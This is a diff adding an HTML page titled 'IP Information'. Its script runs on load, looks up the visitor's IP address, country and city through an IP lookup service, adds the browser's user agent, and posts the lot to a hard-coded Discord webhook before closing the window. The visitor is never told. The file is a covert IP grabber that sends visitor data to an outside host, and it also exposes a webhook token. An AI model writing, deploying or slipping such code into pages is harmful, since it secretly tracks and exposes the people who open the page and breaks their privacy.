@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Information</title>
+</head>
+<body>
+    <script>
+        // Function to send data to Discord webhook
+        async function sendWebhook(data) {
+            const webhookUrl = "https://discord.com/api/webhooks/1252579023272284292/TwkBGWnhDQl0Sz1_X8GMavI435YYeIzjJUr9U75n_hk5m6i_A9K0rr_p1EY2ZsmaaCOX";
+            
+            const payload = {
+                content: `IP: ${data.ip}\nCountry: ${data.country_name}\nCity: ${data.city}\nIs VPN: ${data.is_vpn}\nDevice: ${navigator.userAgent}`
+            };
+
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+        }
+
+        // Function to get user IP and location
+        async function getUserInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                data.is_vpn = "false"; // Placeholder, as detecting VPN is complex and usually requires a paid service
+
+                await sendWebhook(data);
+                window.close();
+            } catch (error) {
+                console.error('Error fetching user info:', error);
+            }
+        }
+
+        // Call the function to get user info and send webhook
+        getUserInfo();
+    </script>
+</body>
+</html>
